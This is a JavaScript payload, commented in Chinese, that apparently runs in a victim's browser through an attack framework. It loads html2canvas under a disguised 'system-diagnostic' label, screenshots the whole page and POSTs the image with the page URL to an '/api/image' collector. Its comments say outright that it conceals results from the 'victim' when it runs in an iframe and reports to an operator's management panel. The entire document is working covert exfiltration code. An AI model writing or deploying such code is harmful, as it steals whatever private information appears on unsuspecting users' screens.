if (typeof html2canvas === 'undefined') { 
  const script = document.createElement('script'); 
  script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js'; 
  script.setAttribute('data-purpose', 'system-diagnostic');
  document.head.appendChild(script); 
  
  return new Promise((resolve) => { 
    script.onload = function() { 
      html2canvas(document.body, { 
        useCORS: true, 
        scale: 0.6, 
        logging: false, 
        allowTaint: true, 
        backgroundColor: null 
      }).then(canvas => { 
        const dataURL = canvas.toDataURL('image/png', 0.8); 
        
        // 确保dataURL是有效的base64字符串
        let imageData = dataURL;
        if (dataURL.indexOf('data:image/') === 0) {
          const parts = dataURL.split(',');
          if (parts.length === 2) {
            imageData = parts[1]; // 只取base64部分
          }
        }
        
        fetch('/api/image', {
          method: 'POST', 
          headers: { 'Content-Type': 'application/json' }, 
          body: JSON.stringify({ 
            image: imageData, 
            url: window.location.href, 
            timestamp: new Date().toISOString(),
            type: 'screenshot'
          }) 
        })
        .then(response => {
          // 对受害者隐藏响应内容
          if (window.parent && window.parent !== window) {
            // 如果在iframe中运行，可能是受害者环境
            return { success: true, filename: 'hidden', url: 'hidden', size: 0 };
          } else {
            return response.json();
          }
        })
        .then(data => { 
          if (data.url === 'hidden') {
            // 对受害者返回空结果
            return;
          } else {
            // 对管理界面返回结果
            resolve('截图已保存:\n文件: ' + data.filename + '\n访问地址: ' + data.url + '\n页面: ' + window.location.href + '\n文件大小: ' + Math.round(data.size/1024) + ' KB\n时间: ' + new Date().toLocaleString()); 
          }
        })
        .catch(err => { 
          // 对管理界面返回错误
          resolve('截图上传失败: ' + err.message); 
        }); 
      })
      .catch(err => { 
        resolve('截图生成失败: ' + err.message); 
      }); 
    }; 
  }); 
} else { 
  return new Promise((resolve) => { 
    html2canvas(document.body, { 
      useCORS: true, 
      scale: 0.6, 
      logging: false, 
      allowTaint: true, 
      backgroundColor: null 
    }).then(canvas => { 
      const dataURL = canvas.toDataURL('image/png', 0.8); 
      
      fetch('/api/image', {
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify({ 
          image: dataURL, 
          url: window.location.href, 
          timestamp: new Date().toISOString(),
          type: 'screenshot'
        }) 
      })
      .then(response => {
        // 对受害者隐藏响应内容
        if (window.parent && window.parent !== window) {
          // 如果在iframe中运行，可能是受害者环境
          return { success: true, filename: 'hidden', url: 'hidden', size: 0 };
        } else {
          return response.json();
        }
      })
      .then(data => { 
        if (data.url === 'hidden') {
          // 对受害者返回空结果
          return;
        } else {
          // 对管理界面返回结果
          resolve('截图已保存:\n文件: ' + data.filename + '\n访问地址: ' + data.url + '\n页面: ' + window.location.href + '\n文件大小: ' + Math.round(data.size/1024) + ' KB\n时间: ' + new Date().toLocaleString()); 
        }
      })
      .catch(err => { 
        // 对管理界面返回错误
        resolve('截图上传失败: ' + err.message); 
      }); 
    })
    .catch(err => { 
      resolve('截图生成失败: ' + err.message); 
    }); 
  }); 
}
